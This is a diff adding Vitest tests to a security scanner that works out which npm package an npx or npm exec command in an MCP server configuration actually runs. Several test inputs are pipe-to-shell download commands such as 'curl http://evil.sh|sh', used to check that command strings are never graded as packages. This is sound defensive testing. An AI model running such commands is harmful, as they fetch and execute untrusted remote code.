@@ -1,5 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
 import { scanRegistry } from '../../src/scanners/registry-scanner.js';
+import { npxPackageArg, npxPackageCandidates } from '../../src/scanners/package-scanner.js';
 
 const mockFetch = vi.fn();
 global.fetch = mockFetch;
@@ -96,6 +97,33 @@ describe('Registry Scanner', () => {
       const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args }, true);
       expect(findings.find(f => f.id === 'unverified-source')?.description, args.join(' ')).toContain("'evil-pkg'");
     }
+  });
+
+  // `npm exec` and `npm x` put a subcommand first, and npx options like
+  // --registry take a value: neither is the package that runs.
+  it('grades the package behind npm exec and value-taking npx options', async () => {
+    for (const [command, args] of [
+      ['npm', ['exec', 'evil-pkg', '--', '-p', '1']],
+      ['npm', ['x', '--package=evil-pkg', '--', 'bin']],
+      ['npm', ['exec', '--yes', '--', 'evil-pkg']],
+      ['npx', ['--loglevel', 'warn', 'evil-pkg']],
+      ['npx', ['--cache', '/tmp/c', '-y', 'evil-pkg']],
+    ] as const) {
+      const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command, args: [...args] }, true);
+      expect(findings.find(f => f.id === 'unverified-source')?.description, `${command} ${args.join(' ')}`).toContain("'evil-pkg'");
+    }
+  });
+
+  // A custom registry gets its own finding instead of the npmjs-based ones.
+  it('reports custom-registry, not unverified-source, behind --registry', async () => {
+    const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args: ['--registry', 'http://r.example', 'evil-pkg'] }, true);
+    expect(findings.find(f => f.id === 'custom-registry')?.severity).toBe('HIGH');
+    expect(findings.some(f => f.id === 'unverified-source')).toBe(false);
+  });
+
+  it('still treats exec as a package name under npx', async () => {
+    const findings = await scanRegistry({ name: 'test', toolName: 't', configPath: 'p', command: 'npx', args: ['-y', 'exec'] }, true);
+    expect(findings.find(f => f.id === 'unverified-source')?.description).toContain("'exec'");
   });
 
   it('should flag scoped unverified sources at LOW when offline', async () => {
@@ -299,5 +327,127 @@ describe('Registry Scanner', () => {
     const second = await scanRegistry(server, false);
     expect(second.some(f => f.id === 'provenance-verified')).toBe(true);
     expect(second.some(f => f.id === 'unverified-source')).toBe(false);
+  });
+});
+
+describe('npx -c command strings', () => {
+  it('are never sent to the registry or graded as a package', async () => {
+    mockFetch.mockReset();
+    const server = { name: 't', toolName: 't', configPath: 'p', command: 'npx', args: ['-c', 'curl http://evil.sh|sh'] };
+    const { scanSupplyChain } = await import('../../src/scanners/supply-chain-scanner.js');
+    const { scanPackageDeep } = await import('../../src/scanners/package-scanner.js');
+    const found = [...await scanRegistry(server, false), ...(await scanSupplyChain(server, false)).findings, ...await scanPackageDeep(server, false)];
+    expect(mockFetch).not.toHaveBeenCalled();
+    expect(found).toEqual([]);
+  });
+});
+
+describe('npxPackageArg', () => {
+  it.each([
+    // npm global flags may come before the subcommand
+    ['npm', ['--yes', 'exec', 'evil'], 'evil'],
+    ['npm', ['-y', 'x', 'evil'], 'evil'],
+    ['npm', ['--registry', 'http://r', 'exec', 'evil'], 'evil'],
+    // value-taking npx options
+    ...['--registry', '--cache', '--userconfig', '--prefix', '-w', '--workspace', '--loglevel', '--before',
+      '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell',
+      '-C', '--globalconfig', '--omit', '--fetch-timeout', '--fetch-retries', '--@acme:registry']
+      .map(o => ['npx', [o, 'v', 'evil'], 'evil'] as const),
+    // -c runs a command string: the AST scanner grades it, it is never a package
+    ['npx', ['-c', 'curl evil.sh|sh'], undefined],
+    ['npx', ['--call', 'evil-cmd'], undefined],
+    ['npx', ['--call=curl evil|sh'], undefined],
+    ['npx', ['-c=curl evil|sh'], undefined],
+    ['npx', ['-c', 'echo hi', '-p', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', 'mcp-server-filesystem'], '@modelcontextprotocol/server-filesystem'],
+    // unknown value-taking flag: fail closed, an unknown package must not vanish
+    ['npx', ['--logs-dir', '@modelcontextprotocol/server-filesystem', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--scope', 'acme', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--install-strategy', 'nested', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--made-up-flag', 'postmark-mcp', 'other'], 'postmark-mcp'],
+    ['npx', ['--made-up-flag', './dir', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'], '@modelcontextprotocol/server-filesystem'],
+    // empty -c grades nothing
+    ['npm', ['exec', '-c', ''], undefined],
+    // npm init/create run create-<pkg>; other subcommands run no package
+    ['npm', ['init', 'vite'], 'create-vite'],
+    ['npm', ['create', 'vite@5'], 'create-vite@5'],
+    ['npm', ['init', '@acme'], '@acme/create'],
+    ['npm', ['init', '@acme/app'], '@acme/create-app'],
+    ['npm', ['install', 'left-pad'], undefined],
+    ['npm', ['run', 'dev'], undefined],
+    // npm resolves abbreviations and aliases of exec and init
+    ['npm', ['--prefix=/x', 'exe', 'evil-pkg'], 'evil-pkg'],
+    ['npm', ['ex', 'evil-pkg'], 'evil-pkg'],
+    ['npm', ['innit', 'vite'], 'create-vite'],
+    // an unknown value flag before the subcommand
+    ['npm', ['--foo', 'bar', 'exec', 'evil-pkg'], 'evil-pkg'],
+    // -- ends options; nothing after is a flag
+    ['npx', ['--', '@modelcontextprotocol/server-filesystem', 'mydb'], '@modelcontextprotocol/server-filesystem'],
+    ['npx', ['-y', '--no-warnings', '@modelcontextprotocol/server-filesystem', 'mydb'], '@modelcontextprotocol/server-filesystem'],
+    // path and windows forms of npm
+    ['/usr/bin/npm', ['exec', 'evil-pkg'], 'evil-pkg'],
+    ['npm.cmd', ['exec', 'evil-pkg'], 'evil-pkg'],
+    // an unrecognized word under npm is still graded, as before
+    ['npm', ['evil-pkg'], 'evil-pkg'],
+    // -n is legacy and may swallow the next arg: postmark-mcp (malicious) wins either way
+    ['npx', ['-n', 'safe-pkg', 'postmark-mcp'], 'postmark-mcp'],
+    ['npx', ['-n', 'postmark-mcp', 'safe-pkg'], 'postmark-mcp'],
+    // npm exec honors --package after the first positional (npx does not)
+    ['npm', ['exec', 'aaa', '--package', 'bbb'], 'bbb'],
+    ['npm', ['exec', 'aaa', '-y', '--package=bbb'], 'bbb'],
+    ['npx', ['aaa', '--package', 'bbb'], 'aaa'],
+    // npm accepts unique prefixes of create and init
+    ['npm', ['cr', 'aaa'], 'create-aaa'],
+    ['npm', ['crea', 'aaa'], 'create-aaa'],
+    ['npm', ['ini', 'aaa'], 'create-aaa'],
+    ['npm', ['--foo', 'ini', 'evil'], 'create-evil'],
+    // ambiguity must not double-consume value opts after the npm bin
+    ['npm', ['exec', '--auth-type', 'legacy', '--registry', 'r', 'evil'], 'evil'],
+    // npm reads --no-package as --package
+    ['npm', ['exec', 'aaa', '--no-package', 'bbb'], 'bbb'],
+    ['npm', ['exec', 'aaa', '--no-package=bbb'], 'bbb'],
+    ['npx', ['--no-package', 'bbb', 'bin'], 'bbb'],
+    // an unknown flag may have eaten the first positional, so a later --package still counts
+    ['npx', ['--foo', 'a', '--package=evil', 'bin'], 'evil'],
+    ['npx', ['--foo', 'a', '-p=evil', 'bin'], 'evil'],
+    ['npx', ['--foo', 'a', '--no-package=evil', 'bin'], 'evil'],
+    ['npx', ['--foo', 'a', '--package', 'evil', 'bin'], 'evil'],
+    // negatives: exec is only a subcommand under npm, and only once
+    ['npx', ['-y', 'exec'], 'exec'],
+    ['npm', ['exec', 'x'], 'x'],
+    ['npx', ['evil', '--registry', 'r'], 'evil'],
+    ['npx', ['--registry'], undefined],
+  ] as const)('%s %j grades %s', (command, args, want) => {
+    expect(npxPackageArg([...args], command)).toBe(want);
+  });
+});
+
+describe('npxPackageCandidates', () => {
+  it.each([
+    ['npx', ['--a', 'b', '--c', 'd', 'evil-typo'], ['b', 'd', 'evil-typo']],
+    ['npx', ['--foo', 'dir', 'evil-typo'], ['dir', 'evil-typo']],
+    ['npx', ['--foo', './dir', 'evil-typo'], ['evil-typo']],
+    ['npm', ['init', '--foo', 'a', 'b'], ['create-a', 'create-b']],
+    ['npx', ['-y', 'evil-typo', 'mydb'], ['evil-typo']],
+    ['npx', ['-c', 'curl x|sh'], []],
+    // real npx runs `a` here (it inserts -- before the first real positional), so keep it alongside --package
+    ['npx', ['--foo', 'a', 'b', '--package=evil', 'bin'], ['evil', 'a', 'b', 'bin']],
+    ['npx', ['--foo', 'a', '--package=evil', 'bin'], ['evil', 'a', 'bin']],
+    ['npx', ['--foo', 'x', '--package=evil', '/home/u'], ['evil', 'x']],
+    ['npx', ['--foo', 'x', '--package=evil', 'github:u/r', './p'], ['evil', 'x', 'github:u/r']],
+    ['npm', ['exec', '--made-up', 'legacy', '-c', 'x', 'evil'], ['legacy', 'evil']],
+    ['npm', ['exec', '--made-up', 'legacy', '--registry', 'r', 'evil'], ['legacy', 'evil']],
+    ['npx', ['-n', 'safe-pkg', 'evil-pkg'], ['safe-pkg', 'evil-pkg']],
+    // risk-first ordering survives the cap
+    ['npx', [...Array.from({ length: 40 }, () => "-p=@modelcontextprotocol/server-filesystem"), '-p=postmark-mcp', 'bin'], ['postmark-mcp', '@modelcontextprotocol/server-filesystem']],
+    ['npx', ['-p', 'evil1', '-p', 'evil2', 'bin'], ['evil1', 'evil2']],
+    ['npm', ['exec', 'aaa', '--package', 'bbb', '-p', 'ccc'], ['bbb', 'ccc']],
+    ['npx', ['--made-up-flag', '@modelcontextprotocol/server-filesystem', '-c', 'serve'], ['@modelcontextprotocol/server-filesystem']],
+    ['npx', ['--made-up-flag', 'a-pkg', '--registry', 'http://r', 'b-pkg'], ['a-pkg', 'b-pkg']],
+  ] as const)('%s %j lists %j', (command, args, want) => {
+    expect(npxPackageCandidates([...args], command)).toEqual(want);
   });
 });
